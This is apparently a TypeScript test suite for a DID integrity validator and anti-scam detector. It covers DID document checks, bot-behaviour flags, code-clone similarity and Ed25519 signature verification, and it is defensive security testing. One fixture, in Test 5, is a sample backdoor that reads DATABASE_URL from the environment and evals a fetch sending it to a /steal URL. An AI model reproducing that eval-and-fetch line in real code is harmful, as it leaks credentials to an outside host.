import { DidValidator } from './did-validator.js';
import { SybilBotDetector } from './sybil-detector.js';
import { CodeCloneDetector } from './code-clone-detector.js';
import { DidDocument } from './types.js';

async function runTests() {
  console.log('================================================================');
  console.log('🛡️ TESTING DID INTEGRITY GUARD & ANTI-SCAM BOT ENGINE');
  console.log('================================================================\n');

  const didValidator = new DidValidator();
  const sybilDetector = new SybilBotDetector();
  const codeDetector = new CodeCloneDetector();

  let passed = 0;
  let failed = 0;

  async function assertTest(name: string, fn: () => Promise<void>) {
    try {
      await fn();
      console.log(`✅ [PASS] ${name}`);
      passed++;
    } catch (err: any) {
      console.log(`❌ [FAIL] ${name}: ${err.message}`);
      failed++;
    }
  }

  // TEST 1: Valid W3C DID Verification
  await assertTest('TEST 1: Verify valid W3C DID document', async () => {
    const validDoc: DidDocument = {
      id: 'did:axiomid:z6MkpTHR8VNsBxYAAWamThYpAAWam',
      verificationMethod: [
        {
          id: 'did:axiomid:z6MkpTHR8VNsBxYAAWamThYpAAWam#key-1',
          type: 'Ed25519VerificationKey2020',
          controller: 'did:axiomid:z6MkpTHR8VNsBxYAAWamThYpAAWam',
          publicKeyMultibase: 'z6MkpTHR8VNsBxYAAWamThYpAAWam',
        },
      ],
      created: '2026-07-22T19:43:00Z',
    };

    const res = didValidator.validateDid(validDoc);
    if (!res.valid) throw new Error(`Expected valid DID, got invalid: ${res.reason}`);
    console.log(`   └─ Valid DID verified | Trust Score: ${res.trustScore}/100`);
  });

  // TEST 2: Detect Malformed & Revoked Fake DID
  await assertTest('TEST 2: Reject Revoked & Fake Malformed DID', async () => {
    const revokedDoc: DidDocument = {
      id: 'did:scammer:fake-key-99',
      verificationMethod: [
        {
          id: 'key-1',
          type: 'Ed25519VerificationKey2020',
          controller: 'did:unauthorized:hacker',
        },
      ],
      revoked: true,
    };

    const res = didValidator.validateDid(revokedDoc);
    if (res.valid) throw new Error('Expected invalid revoked DID, but got valid!');
    console.log(`   └─ Blocked Fake/Revoked DID: "${res.reason}"`);
  });

  // TEST 3: Detect High Velocity Scammer / Sybil Bot
  await assertTest('TEST 3: Detect High-Velocity Scammer Bot', async () => {
    const botTelemetry = {
      agentId: 'agent-bot-scammer-88',
      requestFrequencyPerMin: 250, // Burst rate anomaly
      distinctRecipients: 45,      // High spam fan-out
      payloadEntropyScore: 0.95,
      suspiciousKeywordsCount: 3,
    };

    const res = sybilDetector.evaluateBehavior(botTelemetry);
    if (!res.isScammerBot) throw new Error('Expected Sybil bot flag, but passed!');
    console.log(`   └─ Scammer Bot Flagged! Risk Score: ${res.riskScore}/100 | Flags: ${res.flags.join(', ')}`);
  });

  // TEST 4: Code Clone Detection (Gitee CopyCat Pattern)
  await assertTest('TEST 4: Detect Plagiarized Code Clones (CopyCat Algorithm)', async () => {
    const originalCode = `
      export class RouterEngine {
        private weights = new Map<string, number>();
        public calculateScore(cost: number, latency: number): number {
          return 1.0 / (cost * 0.4 + latency * 0.6);
        }
      }
    `;

    const clonedCode = `
      export class CopyCatRouter {
        private weights = new Map<string, number>();
        public calculateScore(cost: number, latency: number): number {
          return 1.0 / (cost * 0.4 + latency * 0.6);
        }
      }
    `;

    const res = codeDetector.analyzeCode(clonedCode, originalCode);
    if (!res.isFakeOrPlagiarized) throw new Error(`Expected clone score > 0.85, got ${res.similarityScore}`);
    console.log(`   └─ Plagiarized Code Detected! Similarity Score: ${res.similarityScore * 100}%`);
  });

  // TEST 5: Detect Malicious Backdoor Payload in Code
  await assertTest('TEST 5: Detect Malicious Backdoor Payload (eval + env exfiltration)', async () => {
    const maliciousCode = `
      function loadPlugin() {
        const token = process.env.DATABASE_URL;
        eval("fetch('http://192.168.1.100/steal?key=' + token)");
      }
    `;

    const res = codeDetector.analyzeCode(maliciousCode, '');
    if (!res.hasMaliciousPayload) throw new Error('Expected malicious payload detection, but passed!');
    console.log(`   └─ Backdoor Threats Blocked: ${res.detectedThreats.join(' | ')}`);
  });

  // TEST 6: Real WebCrypto Ed25519 Cryptographic Proof Verification
  await assertTest('TEST 6: Real WebCrypto Ed25519 Signature Proof Verification', async () => {
    const { publicKeyJwk, privateKeyJwk } = await didValidator.generateEd25519KeyPair();
    const did = 'did:axiomid:z6MkpRealCryptoKey2026';
    const created = '2026-07-22T20:00:00Z';
    const proofPurpose = 'assertionMethod';
    const canonicalPayload = `${did}:${created}:${proofPurpose}`;

    const signatureBase64 = await didValidator.signEd25519Payload(privateKeyJwk, canonicalPayload);

    const signedDoc: DidDocument = {
      id: did,
      verificationMethod: [
        {
          id: `${did}#key-1`,
          type: 'Ed25519VerificationKey2020',
          controller: did,
          publicKeyJwk,
        },
      ],
      proof: {
        type: 'Ed25519Signature2020',
        created,
        verificationMethod: `${did}#key-1`,
        proofPurpose,
        proofValue: signatureBase64,
      },
    };

    // Verify valid signature
    const validRes = await didValidator.validateDidAsync(signedDoc);
    if (!validRes.valid || !validRes.cryptoVerified || validRes.trustScore !== 100) {
      throw new Error(`Expected valid Ed25519 crypto verification, got: ${JSON.stringify(validRes)}`);
    }

    // Verify tampered signature fails
    const tamperedDoc: DidDocument = {
      ...signedDoc,
      proof: {
        ...signedDoc.proof!,
        proofValue: signatureBase64.slice(0, -4) + 'AAAA', // Tamper signature bytes
      },
    };

    const invalidRes = await didValidator.validateDidAsync(tamperedDoc);
    if (invalidRes.valid || invalidRes.cryptoVerified) {
      throw new Error('Tampered signature passed verification!');
    }

    console.log(`   └─ WebCrypto Ed25519 Cryptography Verified! Valid Signature Trust Score: 100/100 | Tampered Signature Rejected: "${invalidRes.reason}"`);
  });

  console.log('\n================================================================');
  console.log(`📊 TEST RESULTS: ${passed} PASSED | ${failed} FAILED`);
  console.log('================================================================\n');

  if (failed > 0) process.exit(1);
}

runTests().catch((e) => {
  console.error(e);
  process.exit(1);
});
